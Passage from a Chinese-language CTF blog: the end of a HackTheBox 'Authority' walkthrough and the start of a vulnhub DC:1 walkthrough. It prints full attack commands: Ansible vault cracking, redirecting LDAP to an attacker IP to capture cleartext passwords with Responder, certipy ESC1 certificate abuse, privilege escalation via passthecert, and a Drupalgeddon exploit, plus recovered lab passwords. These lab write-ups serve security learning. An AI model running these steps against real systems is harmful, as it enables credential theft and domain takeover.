available\n\n因为不是很熟这些东西的缘故，每个都看了半天，晕晕。\nPWM不知道这些东西都有啥用。先暂时放着，看看8443的https网页是啥。\n\n上来就报了一个提示，说PWM目前处于配置模式，可以不经过LDAP验证就更新配置，然后又给了个登录框。\n灵感来了，在PWM之前我们在SMB里面看到过啊，有没有可能里面存有登录凭证啥的？回去翻一翻。\nAnsible_vault密文破解smb: \\Automation\\Ansible\\PWM\\defaults\\&gt; ls  .            D        0  Fri Mar 17 09:20:48 2023  ..           D        0  Fri Mar 17 09:20:48 2023  main.yml     A     1591  Sun Apr 23 18:51:38 20235888511 blocks of size 4096. 1215531 blocks availablesmb: \\Automation\\Ansible\\PWM\\defaults\\&gt; get main.ymlgetting file \\Automation\\Ansible\\PWM\\defaults\\main.yml of size 1591 as main.yml (5.0 KiloBytes/sec) (average 3.8 KiloBytes/sec)\n\n我们在\\Automation\\Ansible\\PWM\\defaults\\目录下发现了一个main.yml文件，看看内容\n---pwm_run_dir: &quot;&#123;&#123; lookup(&#x27;env&#x27;, &#x27;PWD&#x27;) &#125;&#125;&quot;pwm_hostname: authority.htb.corppwm_http_port: &quot;&#123;&#123; http_port &#125;&#125;&quot;pwm_https_port: &quot;&#123;&#123; https_port &#125;&#125;&quot;pwm_https_enable: truepwm_require_ssl: falsepwm_admin_login: !vault |          $ANSIBLE_VAULT;1.1;AES256          32666534386435366537653136663731633138616264323230383566333966346662313161326239          6134353663663462373265633832356663356239383039640a346431373431666433343434366139          35653634376333666234613466396534343030656165396464323564373334616262613439343033          6334326263326364380a653034313733326639323433626130343834663538326439636232306531          3438pwm_admin_password: !vault |          $ANSIBLE_VAULT;1.1;AES256          31356338343963323063373435363261323563393235633365356134616261666433393263373736          3335616263326464633832376261306131303337653964350a363663623132353136346631396662          38656432323830393339336231373637303535613636646561653637386634613862316638353530          3930356637306461350a316466663037303037653761323565343338653934646533663365363035          6531ldap_uri: ldap://127.0.0.1/ldap_base_dn: &quot;DC=authority,DC=htb&quot;ldap_admin_password: !vault |          $ANSIBLE_VAULT;1.1;AES256          63303831303534303266356462373731393561313363313038376166336536666232626461653630          3437333035366235613437373733316635313530326639330a643034623530623439616136363563          34646237336164356438383034623462323531316333623135383134656263663266653938333334          3238343230333633350a646664396565633037333431626163306531336336326665316430613566          3764\n\npwm_admin_login,pwm_admin_password,ldap_admin_password这不就是登录凭证嘛。但是这明显是加密后的格式，我们要先解密。先搜一下$ANSIBLE_VAULT是什么加密方式，怎么处理。\n我们谷歌一下发现Pentester’s Promiscuous Notebook上有对Ansible的处理方式介绍。\n\n我们按着来。\n$ cat ldap.yml$ANSIBLE_VAULT;1.1;AES256633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a64303462353062343961613636356334646237361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764$ ansible2john ldap.ymlldap.yml:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2e98334284203635$ ansible2john ldap.yml &gt; ldap.hash$ john ldap.hash --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])Cost 1 (iteration count) is 10000 for all loaded hashesWill run 2 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status********         (ldap.yml)1g 0:00:00:49 DONE (2023-07-25 03:21) 0.02030g/s 807.7p/s 807.7c/s 807.7C/s 001983..woodsonUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed.\n\n一通操作下来把vault的密码给破解出来了，那我们接下来就把获取到的三条密文的内容都解密一下。\ncat ldap.yml | $ ansible-vault decryptVault password:Decryption successfulDevT3st@123cat username.yml | $ ansible-vault decrypt Vault password:Decryption successfuls******m$ ansible-vault decrypt ldap.ymlVault password:Decryption successfulp**********3\n\nPWM配置文件利用拿到了登录凭证我们就去PWM登录界面登录一下。\n\n发现并登不上，那就登录一下Configuration Manager，\n\n结合之前打开网页弹出的提示，我们可以不经过LDAP验证而对配置文件进行修改。先把配置文件下载下来，你会发现内容怎么这么多，我们要从哪里下手。这是我们细看一下网页会发现，Health一栏中，LDAP报了一个大大的WARN：\n\nUnable to connect to LDAP server default, error: error connecting to  ldap directory (default), error: unable to create connection: unable to  connect to any configured ldap url, last error: unable to bind to  ldaps:&#x2F;&#x2F;authority.authority.htb:636 as CN&#x3D;svc_ldap,OU&#x3D;Service  Accounts,OU&#x3D;CORP,DC&#x3D;authority,DC&#x3D;htb reason: CommunicationException  (authority.authority.htb:636; PKIX path building failed:  sun.security.provider.certpath.SunCertPathBuilderException: unable to  find valid certification path to requested target)\n\n这说明与主机的LDAP服务器没连接上，我们甚至还能发现用户名：CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb，那我们在配置文件里面把其LDAP服务的地址改成我们自己的，就能监听到其向LDAP服务器请求验证的账户名和密码了。\n直接在配置文件里面搜索ldaps://authority.authority.htb:636，然后改成我们自己的：\n&lt;setting key=&quot;ldap.serverUrls&quot; modifyTime=&quot;2022-08-11T01:46:23Z&quot; profile=&quot;default&quot; syntax=&quot;STRING_ARRAY&quot; syntaxVersion=&quot;0&quot;&gt;            &lt;label&gt;LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs&lt;/label&gt;            &lt;value&gt;ldap://10.10.14.96:389&lt;/value&gt;\n\n这里改成389端口的ldap服务而不是636的ldaps的原因是因为LDAP是明文协议，更方便我们获取用户的明文登录凭证。改好之后我们直接import configuration。\nldap监听然后本地起一个responder监听一下。\n$ sudo responder -I tun0                                         __  .----.-----.-----.-----.-----.-----.--|  |.-----.----.  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                   |__|           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0  To support this project:  Patreon -&gt; https://www.patreon.com/PythonResponder  Paypal  -&gt; https://paypal.me/PythonResponder  Author: Laurent Gaffie (laurent.gaffie@gmail.com)  To kill this script hit CTRL-C[+] Poisoners:    LLMNR                      [ON]    NBT-NS                     [ON]    MDNS                       [ON]    DNS                        [ON]    DHCP                       [OFF][+] Servers:    HTTP server                [ON]    HTTPS server               [ON]    WPAD proxy                 [OFF]    Auth proxy                 [OFF]    SMB server                 [ON]    Kerberos server            [ON]    SQL server                 [ON]    FTP server                 [ON]    IMAP server                [ON]    POP3 server                [ON]    SMTP server                [ON]    DNS server                 [ON]    LDAP server                [ON]    RDP server                 [ON]    DCE-RPC server             [ON]    WinRM server               [ON][+] HTTP Options:    Always serving EXE         [OFF]    Serving EXE                [OFF]    Serving HTML               [OFF]    Upstream Proxy             [OFF][+] Poisoning Options:    Analyze Mode               [OFF]    Force WPAD auth            [OFF]    Force Basic Auth           [OFF]    Force LM downgrade         [OFF]    Force ESS downgrade        [OFF][+] Generic Options:    Responder NIC              [tun0]    Responder IP               [HTB_VPN_IP]    Responder IPv6             [HTB_VPN_IPv6]    Challenge set              [random]    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;][+] Current Session Variables:    Responder Machine Name     [*************]    Responder Domain Name      [********]    Responder DCE-RPC Port     [48723][+] Listening for events...[LDAP] Cleartext Client   : 10.10.11.222[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb[LDAP] Cleartext Password : l*****************![*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb\n\n那么我们就拿到了ldap的明文登录凭证。\n提权因为我们已经拿到了ldap的登录凭证，此时可以直接用evil-winrm登录，在desktop上可以拿到user flag。\n$ evil-winrm -i 10.10.11.222 -u svc_ldap -p l**************r!Evil-WinRM shell v3.5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents&gt; cd ../Desktop*Evil-WinRM* PS C:\\Users\\svc_ldap\\Desktop&gt; dir    Directory: C:\\Users\\svc_ldap\\DesktopMode                LastWriteTime         Length Name----                -------------         ------ -----ar---        7/25/2023   8:18 AM             34 user.txt\n\n提权到rootWindows这块提取不太熟，先拿certipy扫一下活动目录证书服务（AD CS）中是否有错误配置项可以利用。\n$ certipy find -vulnerable -u svc_ldap@authority.htb -p &#x27;lDaP_1n_th3_cle4r!&#x27; -dc-ip 10.10.11.222Certipy v4.7.0 - by Oliver Lyak (ly4k)[*] Finding certificate templates[*] Found 37 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 13 enabled certificate templates[*] Trying to get CA configuration for &#x27;AUTHORITY-CA&#x27; via CSRA[!] Got error while trying to get CA configuration for &#x27;AUTHORITY-CA&#x27; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.[*] Trying to get CA configuration for &#x27;AUTHORITY-CA&#x27; via RRP[!] Failed to connect to remote registry. Service should be starting now. Trying again...[*] Got CA configuration for &#x27;AUTHORITY-CA&#x27;[-] Got error: module &#x27;enum&#x27; has no attribute &#x27;_decompose&#x27;[-] Use -debug to print a stacktrace\n\n报错了，说是enum模块没有_decompose属性，查了一下好像python3.11.4之后的版本好像删掉了这块，懒得用conda虚拟环境创了，我们偷个懒，直接在网上找到_decompose源代码加到enum.py里面（不建议学习，最好先做好备份，用后记得还原）。\n这样就能用了。\n$ certipy find -vulnerable -u svc_ldap@authority.htb -p &#x27;l************r!&#x27; -dc-ip 10.10.11.222Certipy v4.3.0 - by Oliver Lyak (ly4k)[*] Finding certificate templates[*] Found 37 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 13 enabled certificate templates[*] Trying to get CA configuration for &#x27;AUTHORITY-CA&#x27; via CSRA[!] Got error while trying to get CA configuration for &#x27;AUTHORITY-CA&#x27; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.[*] Trying to get CA configuration for &#x27;AUTHORITY-CA&#x27; via RRP[*] Got CA configuration for &#x27;AUTHORITY-CA&#x27;[*] Saved BloodHound data to &#x27;20230725042904_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k[*] Saved text output to &#x27;20230725042904_Certipy.txt&#x27;[*] Saved JSON output to &#x27;20230725042904_Certipy.json&#x27;\n\n扫描结果在20230725042904_Certipy.txt就能看到。\n$ cat 20230725042904_Certipy.txtCertificate Authorities  0    CA Name                             : AUTHORITY-CA    DNS Name                            : authority.authority.htb    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4    Certificate Validity Start          : 2023-04-24 01:46:26+00:00    Certificate Validity End            : 2123-04-24 01:56:25+00:00    Web Enrollment                      : Disabled    User Specified SAN                  : Disabled    Request Disposition                 : Issue    Enforce Encryption for Requests     : Enabled    Permissions      Owner                             : AUTHORITY.HTB\\Administrators      Access Rights        ManageCa                        : AUTHORITY.HTB\\Administrators                                          AUTHORITY.HTB\\Domain Admins                                          AUTHORITY.HTB\\Enterprise Admins        ManageCertificates              : AUTHORITY.HTB\\Administrators                                          AUTHORITY.HTB\\Domain Admins                                          AUTHORITY.HTB\\Enterprise Admins        Enroll                          : AUTHORITY.HTB\\Authenticated UsersCertificate Templates  0    Template Name                       : CorpVPN    Display Name                        : Corp VPN    Certificate Authorities             : AUTHORITY-CA    Enabled                             : True    Client Authentication               : True    Enrollment Agent                    : False    Any Purpose                         : False    Enrollee Supplies Subject           : True    Certificate Name Flag               : EnrolleeSuppliesSubject    Enrollment Flag                     : IncludeSymmetricAlgorithms                                          PublishToDs                                          AutoEnrollmentCheckUserDsCertificate    Private Key Flag                    : ExportableKey    Extended Key Usage                  : Encrypting File System                                          Secure Email                                          Client Authentication                                          Document Signing                                          IP security IKE intermediate                                          IP security use                                          KDC Authentication    Requires Manager Approval           : False    Requires Key Archival               : False    Authorized Signatures Required      : 0    Validity Period                     : 20 years    Renewal Period                      : 6 weeks    Minimum RSA Key Length              : 2048    Permissions      Enrollment Permissions        Enrollment Rights               : AUTHORITY.HTB\\Domain Computers                                          AUTHORITY.HTB\\Domain Admins                                          AUTHORITY.HTB\\Enterprise Admins      Object Control Permissions        Owner                           : AUTHORITY.HTB\\Administrator        Write Owner Principals          : AUTHORITY.HTB\\Domain Admins                                          AUTHORITY.HTB\\Enterprise Admins                                          AUTHORITY.HTB\\Administrator        Write Dacl Principals           : AUTHORITY.HTB\\Domain Admins                                          AUTHORITY.HTB\\Enterprise Admins                                          AUTHORITY.HTB\\Administrator        Write Property Principals       : AUTHORITY.HTB\\Domain Admins                                          AUTHORITY.HTB\\Enterprise Admins                                          AUTHORITY.HTB\\Administrator    [!] Vulnerabilities      ESC1                              : &#x27;AUTHORITY.HTB\\\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication\n\n我们发现存在ESC1漏洞。直接搜一下如何利用。这篇文章有介绍。照葫芦画瓢。\n先按照上面提供的信息请求一下带有管理员权限的证书。\n$ certipy req -u &#x27;exp$&#x27; -p &#x27;Exp114514&#x27; -target 10.10.11.222 -ca AUTHORITY-CA -template &#x27;CorpVPN&#x27; -upn &#x27;Administrator&#x27;Certipy v4.3.0 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Successfully requested certificate[*] Request ID is 5[*] Got certificate with UPN &#x27;Administrator&#x27;[*] Certificate has no object SID[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;\n\n其中-upn用于指定用户主体名 (User Principal Name) 。\n然后我们再把获取到的.pfx文件拆成证书和密钥。\n$ certipy cert -pfx administrator.pfx -nokey -out user.crtCertipy v4.3.0 - by Oliver Lyak (ly4k)[*] Writing certificate and  to &#x27;user.crt&#x27;$ certipy cert -pfx administrator.pfx -nocert -out user.keyCertipy v4.3.0 - by Oliver Lyak (ly4k)[*] Writing private key to &#x27;user.key&#x27;\n\n我们可以用 passthecert工具登录ldap shell进行管理（提权）操作。\n$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222Impacket v0.10.0 - Copyright 2022 SecureAuth CorporationType help for list of commands# add_user_to_group svc_ldap AdministratorsAdding user: svc_ldap to group Administrators result: OK# exitBye!\n\n我们将svc_ldap用户添加到管理员组中。\n此时我们如果查看一下用户权限会发现并没有加到用户组中，这是因为还没更新，退出重新登录一下就好。\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents&gt; whoami /userUSER INFORMATION----------------User Name    SID============ =============================================htb\\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents&gt; net user svc_ldapUser name                    svc_ldapFull NameCommentUser&#x27;s commentCountry/region code          000 (System Default)Account active               YesAccount expires              NeverPassword last set            8/10/2022 9:29:31 PMPassword expires             NeverPassword changeable          8/11/2022 9:29:31 PMPassword required            YesUser may change password     NoWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   7/5/2023 8:43:09 PMLogon hours allowed          AllLocal Group Memberships      *Remote Management UseGlobal Group memberships     *Domain UsersThe command completed successfully.\n\n$ evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents&gt; net user svc_ldapUser name                    svc_ldapFull NameCommentUser&#x27;s commentCountry/region code          000 (System Default)Account active               YesAccount expires              NeverPassword last set            8/10/2022 9:29:31 PMPassword expires             NeverPassword changeable          8/11/2022 9:29:31 PMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   7/5/2023 8:43:09 PMLogon hours allowed          AllLocal Group Memberships      *Administrators       *Remote Management UseGlobal Group memberships     *Domain UsersThe command completed successfully.\n\n此时就可以拿到root flag了。\n*Evil-WinRM* PS C:\\Users\\Administrator&gt; dir    Directory: C:\\Users\\AdministratorMode                LastWriteTime         Length Name----                -------------         ------ ----d-----        8/10/2022   8:52 PM                .pwm-workpathd-r---        7/12/2023   1:21 PM                3D Objectsd-r---        7/12/2023   1:21 PM                Contactsd-r---        7/12/2023   1:21 PM                Desktopd-r---        7/12/2023   1:21 PM                Documentsd-r---        7/12/2023   1:21 PM                Downloadsd-r---        7/12/2023   1:21 PM                Favoritesd-r---        7/12/2023   1:21 PM                Linksd-r---        7/12/2023   1:21 PM                Musicd-r---        7/12/2023   1:21 PM                Picturesd-r---        7/12/2023   1:21 PM                Saved Gamesd-r---        7/12/2023   1:21 PM                Searchesd-r---        7/12/2023   1:21 PM                Videos-a----        3/17/2023   9:30 AM          16384 gp.jfm*Evil-WinRM* PS C:\\Users\\Administrator&gt; cd Desktopdi*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; dir    Directory: C:\\Users\\Administrator\\DesktopMode                LastWriteTime         Length Name----                -------------         ------ -----ar---        7/25/2023   9:44 AM             34 root.txt*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; type root.txt\n\n成功拿下。\n总结主要考察了对LDAP的理解，学到了很多东西。\n","categories":["HackTheBox"],"tags":["walkthrough","Windows"]},{"title":"[vulnhub]  DC:1","url":"/2023/05/27/DC-1/","content":"\n\n\n简介vulnhub上DC系列第一台靶机。比较简单。\n信息收集nmap主机发现，端口扫描，TCP扫描，服务识别，系统探测，脚本漏扫\n┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]└─$ sudo nmap -sn 192.168.56.0/24                     [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:19 CSTNmap scan report for 192.168.56.1Host is up (0.00053s latency).MAC Address: 0A:00:27:00:00:08 (Unknown)Nmap scan report for 192.168.56.100Host is up (0.000092s latency).MAC Address: 08:00:27:2E:A1:5A (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.109Host is up (0.00057s latency).MAC Address: 08:00:27:5F:F1:0D (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.144Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 2.31 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.109Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:20 CSTWarning: 192.168.56.109 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.109Host is up (0.00030s latency).Not shown: 40138 filtered tcp ports (no-response), 25393 closed tcp ports (reset)PORT      STATE SERVICE22/tcp    open  ssh80/tcp    open  http111/tcp   open  rpcbind49001/tcp open  nusrpMAC Address: 08:00:27:5F:F1:0D (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 116.03 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]└─$ sudo nmap -sT -sV -sC -O -p22,80,111,49001 192.168.56.109Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:22 CSTNmap scan report for 192.168.56.109Host is up (0.00088s latency).PORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)| ssh-hostkey: |   1024 c4d659e6774c227a961660678b42488f (DSA)|   2048 1182fe534edc5b327f446482757dd0a0 (RSA)|_  256 3daa985c87afea84b823688db9055fd8 (ECDSA)80/tcp    open  http    Apache httpd 2.2.22 ((Debian))|_http-title: Welcome to Drupal Site | Drupal Site|_http-server-header: Apache/2.2.22 (Debian)|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt111/tcp   open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100024  1          37080/udp   status|   100024  1          47634/udp6  status|   100024  1          49001/tcp   status|_  100024  1          53648/tcp6  status49001/tcp open  status  1 (RPC #100024)MAC Address: 08:00:27:5F:F1:0D (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.2 - 3.16Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.95 seconds                    ┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]└─$ sudo nmap --script=vuln 192.168.56.109                   Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:23 CSTNmap scan report for 192.168.56.109Host is up (0.00032s latency).Not shown: 997 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http| http-enum: |   /rss.xml: RSS or Atom feed|   /robots.txt: Robots file|   /UPGRADE.txt: Drupal file|   /INSTALL.txt: Drupal file|   /INSTALL.mysql.txt: Drupal file|   /INSTALL.pgsql.txt: Drupal file|   /: Drupal version 7 |   /README: Interesting, a readme.|   /README.txt: Interesting, a readme.|   /0/: Potentially interesting folder|_  /user/: Potentially interesting folder| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.109|   Found the following possible CSRF vulnerabilities: |     |     Path: http://192.168.56.109:80/|     Form id: user-login-form|     Form action: /node?destination=node|     |     Path: http://192.168.56.109:80/user/password|     Form id: user-pass|     Form action: /user/password|     |     Path: http://192.168.56.109:80/user/register|     Form id: user-register-form|     Form action: /user/register|     |     Path: http://192.168.56.109:80/node?destination=node|     Form id: user-login-form|     Form action: /node?destination=node|     |     Path: http://192.168.56.109:80/user|     Form id: user-login|     Form action: /user|     |     Path: http://192.168.56.109:80/user/|     Form id: user-login|_    Form action: /user/| http-vuln-cve2014-3704: |   VULNERABLE:|   Drupal - pre Auth SQL Injection Vulnerability|     State: VULNERABLE (Exploitable)|     IDs:  CVE:CVE-2014-3704|         The expandArguments function in the database abstraction API in|         Drupal core 7.x before 7.32 does not properly construct prepared|         statements, which allows remote attackers to conduct SQL injection|         attacks via an array containing crafted keys.|           |     Disclosure date: 2014-10-15|     References:|       http://www.securityfocus.com/bid/70595|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704|       https://www.drupal.org/SA-CORE-2014-005|_      https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.111/tcp open  rpcbindMAC Address: 08:00:27:5F:F1:0D (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 356.20 seconds\n\n可以发现80端口爆大米了，一堆信息，甚至还爆了CVE-2014-3704的漏洞。该挑谁先下手不用多说了。\nweb渗透总所周知，在下手之前得先踩点。先识别下网站的技术栈。\n┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]└─$ sudo whatweb http://192.168.56.109[sudo] password for kali: http://192.168.56.109 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.56.109], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[php,text/javascript], Title[Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]\n\n发现网站是基于Drupal 7的CMS搭建的。结合之前编号CVE-2014-3704的漏洞，我们打算利用这个CMS的漏洞。\n在操作之前，不忘在后台挂个网站目录发现，说不定有啥好东西。（实际上确实可以扫出很多目录和文件，虽然不一定对我们有用）\n搜一下公开的漏洞：\n┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]└─$ searchsploit Drupal                   ----------------------------------------------------------- --------------------------------- Exploit Title                                             |  Path----------------------------------------------------------- ---------------------------------Drupal 4.0 - News Message HTML Injection                   | php/webapps/21863.txtDrupal 4.1/4.2 - Cross-Site Scripting                      | php/webapps/22940.txtDrupal 4.5.3 &lt; 4.6.1 - Comments PHP Injection              | php/webapps/1088.plDrupal 4.7 - &#x27;Attachment mod_mime&#x27; Remote Command Executio | php/webapps/1821.phpDrupal 4.x - URL-Encoded Input HTML Injection              | php/webapps/27020.txtDrupal 5.2 - PHP Zend Hash ation Vector                    | php/webapps/4510.txtDrupal 5.21/6.16 - Denial of Service                       | php/dos/10826.shDrupal 6.15 - Multiple Persistent Cross-Site Scripting Vul | php/webapps/11060.txtDrupal 7.0 &lt; 7.31 - &#x27;Drupalgeddon&#x27; SQL Injection (Add Admi | php/webapps/34992.pyDrupal 7.0 &lt; 7.31 - &#x27;Drupalgeddon&#x27; SQL Injection (Admin Se | php/webapps/44355.phpDrupal 7.0 &lt; 7.31 - &#x27;Drupalgeddon&#x27; SQL Injection (PoC) (Re | php/webapps/34984.pyDrupal 7.0 &lt; 7.31 - &#x27;Drupalgeddon&#x27; SQL Injection (PoC) (Re | php/webapps/34993.phpDrupal 7.0 &lt; 7.31 - &#x27;Drupalgeddon&#x27; SQL Injection (Remote C | php/webapps/35150.phpDrupal 7.12 - Multiple Vulnerabilities                     | php/webapps/18564.txtDrupal 7.x Module Services - Remote Code Execution         | php/webapps/41564.phpDrupal &lt; 4.7.6 - Post Comments Remote Command Execution    | php/webapps/3313.plDrupal &lt; 5.1 - Post Comments Remote Command Execution      | php/webapps/3312.plDrupal &lt; 5.22/6.16 - Multiple Vulnerabilities              | php/webapps/33706.txtDrupal &lt; 7.34 - Denial of Service                          | php/dos/35415.txtDrupal &lt; 7.58 - &#x27;Drupalgeddon3&#x27; (Authenticated) Remote Cod | php/webapps/44542.txtDrupal &lt; 7.58 - &#x27;Drupalgeddon3&#x27; (Authenticated) Remote Cod | php/webapps/44557.rbDrupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#x27;Drupalgeddo | php/webapps/44449.rbDrupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#x27;Drupalgeddon2&#x27; Remot | php/remote/44482.rbDrupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#x27;Drupalgeddon2&#x27; Remot | php/webapps/44448.pyDrupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserial | php/remote/46510.rbDrupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execu | php/webapps/46452.txtDrupal &lt; 8.6.9 - REST Module Remote Code Execution         | php/webapps/46459.pyDrupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Dis | php/webapps/44501.txtDrupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripti | php/webapps/50841.txtDrupal Module Ajax Checklist 5.x-1.0 - Multiple SQL Inject | php/webapps/32415.txtDrupal Module CAPTCHA - Security Bypass                    | php/webapps/35335.htmlDrupal Module CKEditor 3.0 &lt; 3.6.2 - Persistent EventHandl | php/webapps/18389.txtDrupal Module CKEditor &lt; 4.1WYSIWYG (Drupal 6.x/7.x) - Per | php/webapps/25493.txtDrupal Module CODER 2.5 - Remote Command Execution (Metasp | php/webapps/40149.rbDrupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execut | php/remote/40144.phpDrupal Module Cumulus 5.x-1.1/6.x-1.4 - &#x27;tagcloud&#x27; Cross-S | php/webapps/35397.txtDrupal Module Drag &amp; Drop Gallery 6.x-1.5 - &#x27;upload.php&#x27; A | php/webapps/37453.phpDrupal Module Embedded Media Field/Media 6.x : Video Flots | php/webapps/35072.txtDrupal Module MiniorangeSAML 8.x-2.22 - Privilege escalati | php/webapps/50361.txtDrupal Module RESTWS 7.x - PHP Remote Code Execution (Meta | php/remote/40130.rbDrupal Module Sections - Cross-Site Scripting              | php/webapps/10485.txtDrupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection    | php/webapps/33410.txt----------------------------------------------------------- ---------------------------------Shellcodes: No Results\n\n其中34992.py写着Add admin，对我们挺有吸引力的。试下怎么样。\n漏洞利用┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]└─$ python2 34992.py -t http://192.168.56.109 -u test -p test  ______                          __     _______  _______ _____ |   _  \\ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   | |.  |   \\|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   | |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  | |:  1    /          |__|                 |   |  |:  1   | |:  | |::.. . /                                |   |  |::.. . | |::.| `------&#x27;                                 `---&#x27;  `-------&#x27; `---&#x27;  _______       __     ___       __            __   __ |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----. |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     | |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__| |:  1   |  |__|      |:  |    |___| |::.. . |            |::.| `-------&#x27;            `---&#x27;                                 Drup4l =&gt; 7.0 &lt;= 7.31 Sql-1nj3ct10n                                              Admin 